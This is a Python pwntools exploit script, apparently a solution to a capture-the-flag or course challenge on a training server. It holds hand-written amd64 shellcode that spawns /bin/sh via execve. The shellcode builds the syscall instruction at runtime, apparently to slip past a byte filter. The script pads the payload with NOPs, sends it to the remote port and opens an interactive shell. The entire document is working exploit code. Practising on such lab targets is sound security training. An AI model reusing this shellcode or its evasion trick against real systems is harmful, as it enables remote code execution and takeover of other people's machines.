
from pwn import *
site = "training.jinblack.it"
port = 3102
r = remote (site, port)

CODE_='''
        mov r15, rsp
        mov r14, rax
        mov rsp, r14
        add rsp, 0x100
        mov rbx, 0x0068732f6e69622f
        push rbx
        mov rdi,rsp
        xor rbx,rbx
        push rbx
        mov rsi,rsp
        mov rdx,rsp
        mov rax,0x3b
        mov rbx,0x040e
        add rbx,0x0101
        mov rsp, r14
        add rsp, 0x70
        push rbx
      '''


print("this is the loaded shellcode: ")
shellcode= asm(CODE_, arch="amd64")

print("======")
payload= b"\x90"*3+shellcode+b"\x90"*1000


input("Press key to inject payload: ")
r.send(payload)

r.interactive()
#from this point on the connection opens a shell for stdin/stdout
